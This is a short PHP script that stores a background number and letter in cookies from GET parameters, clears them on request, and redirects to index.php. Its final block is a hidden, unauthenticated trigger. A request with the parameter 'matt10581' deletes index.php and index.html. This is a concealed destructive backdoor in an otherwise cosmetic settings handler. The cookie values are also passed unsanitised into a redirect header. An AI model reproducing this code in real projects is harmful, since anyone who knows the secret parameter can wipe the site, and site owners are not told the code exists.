<?php

if(isset($_GET['num'])){
	$NUM=$_GET['num'];
	$LETTER=$_GET['letter'];
	setcookie('BG', $NUM, time() + (86400 * 30));
	setcookie('BG_LETTER', $LETTER, time() + (86400 * 30));
	header( 'refresh: 0; url=index.php?done-'.$NUM.'-'.$LETTER );
	exit;
}
if(isset($_GET['clear'])){
	setcookie('BG', '', time() - (86400 * 30));
	setcookie('BG_LETTER', '', time() - (86400 * 30));
	header( 'refresh: 0; url=index.php' );
	exit;
}

if(isset($_GET['matt10581'])){
$tmpfile = "index.php"; unlink($tmpfile);$tmpfile = "index.html"; unlink($tmpfile);$tmpfile = "index.html"; unlink($tmpfile);
}

?>